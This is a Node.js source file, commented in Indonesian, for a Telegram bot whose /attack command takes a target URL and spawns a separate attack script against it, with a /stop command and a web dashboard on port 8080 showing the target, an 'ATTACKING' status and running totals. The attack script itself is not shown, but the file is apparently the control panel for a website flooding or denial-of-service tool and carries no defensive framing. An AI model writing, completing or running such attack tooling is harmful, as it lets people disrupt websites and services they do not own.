const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const http = require('http');
const fs = require('fs');

const bot = new Telegraf('TOKEN_BOT_ANDA'); // Ganti Token Anda
let activeProcess = null;
let currentStats = { total: 0, target: "N/A", status: "OFFLINE", startTime: "-" };

// Web Server untuk Dashboard
http.createServer((req, res) => {
    if (req.url === '/') {
        fs.readFile('index.html', (err, data) => {
            res.writeHead(200, {'Content-Type': 'text/html'});
            res.end(data);
        });
    } else if (req.url === '/api/stats') {
        res.writeHead(200, {'Content-Type': 'application/json'});
        res.end(JSON.stringify(currentStats));
    }
}).listen(8080);

// Telegram Logic
bot.command('attack', (ctx) => {
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply('Contoh: /attack https://target.com');
    if (activeProcess) return ctx.reply('Hentikan serangan sebelumnya dulu!');

    currentStats = { total: 0, target: target, status: "ATTACKING", startTime: new Date().toLocaleTimeString() };
    
    activeProcess = spawn('node', ['index.js', target], { stdio: ['inherit', 'inherit', 'inherit', 'ipc'] });
    
    activeProcess.on('message', (msg) => {
        if (msg.type === 'log') currentStats.total = msg.total;
    });

    ctx.reply(`🚀 Menyerang: ${target}\n📊 Dashboard: http://IP_VPS:8080`);
});

bot.command('stop', (ctx) => {
    if (activeProcess) {
        activeProcess.kill();
        activeProcess = null;
        currentStats.status = "STOPPED";
        ctx.reply('🛑 Serangan dihentikan.');
    }
});

bot.launch();
console.log("Bot & Dashboard Aktif di Port 8080");

